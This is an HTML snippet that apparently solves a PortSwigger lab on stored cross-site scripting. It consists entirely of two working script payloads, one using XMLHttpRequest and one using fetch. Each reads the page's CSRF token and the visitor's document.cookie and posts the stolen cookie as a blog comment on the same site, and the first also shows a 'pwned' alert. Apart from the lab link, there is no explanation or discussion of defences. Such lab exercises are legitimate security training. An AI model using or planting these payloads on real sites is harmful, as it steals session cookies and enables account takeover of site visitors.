<!-- Portswigger Lab: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies -->
<!-- Stealing cookies of user by posting them in comments -->

<script>
    // Wait for DOM to load fully
    window.addEventListener("DOMContentLoaded", () => {
        var csrf = document.getElementsByName('csrf')[0].value;
        var comment = "My Cookie: " + document.cookie;

        var data = "csrf="+csrf+"&postId=7&comment="+comment+"&name=test1234&email=a@a.com&website=http://a.com";

        var url = "/post/comment";
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(data);

        xhr.onreadystatechange = function (){
            if (this.readyState == 4 && this.status == 200){
                alert("You have been pwned!")
            }
        }
    })
</script>

<!-- Another Method using fetch & form -->
 <script>

    window.addEventListener("DOMContentLoaded", () => {
        var token = document.getElementsByName('csrf')[0].value;
        var cookie = "My Cookie: " + document.cookie;

        var form = new FormData();
        form.append("csrf", token);
        form.append("postId", 7);
        form.append("comment", cookie);
        form.append("name", "victim");
        form.append("email", "a@a.com");
        form.append("website", "http://a.com");

        var url = "/post/comment";


        fetch(url, {
            method: "POST",
            mode: "no-cors",
            body: form
        });
    })
 </script>